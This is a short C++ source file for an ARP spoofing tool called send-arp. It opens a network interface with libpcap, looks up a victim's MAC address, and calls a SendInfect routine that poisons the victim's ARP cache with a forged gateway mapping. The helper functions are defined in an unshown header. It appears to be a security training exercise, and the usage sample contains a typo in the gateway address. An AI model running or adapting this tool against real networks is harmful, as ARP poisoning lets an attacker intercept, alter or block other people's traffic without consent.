#include <pcap.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <cstdio>
#include "hdr.h"

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 172.20.10.3 172,20,10,1\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    uint8_t MY_MAC[6];
    uint8_t SENDER_MAC[6];
    uint32_t SENDER_IP = Str2A(argv[2]);
    uint32_t GATEWAY_IP = Str2A(argv[3]);
    uint32_t MY_IP = GetMyIp(dev);
    GetMyMac(dev,MY_MAC);

    SendRequest(handle,MY_IP,MY_MAC,SENDER_IP,SENDER_MAC);
    SendInfect(handle,MY_MAC,SENDER_IP,SENDER_MAC,GATEWAY_IP);
    printf("My Linux on VM\n");
    printf("---------------------------------\n");
    PrintIP("My VM IP", ntohl(MY_IP));
    printf("---------------------------------\n\n");
    printf("Sender Info\n");
    printf("---------------------------------\n");
    PrintIP("Sender IP", ntohl(SENDER_IP));
    printf("---------------------------------\n");
    PrintMAC("Sender MAC", SENDER_MAC);
    printf("---------------------------------\n");
    pcap_close(handle);
}

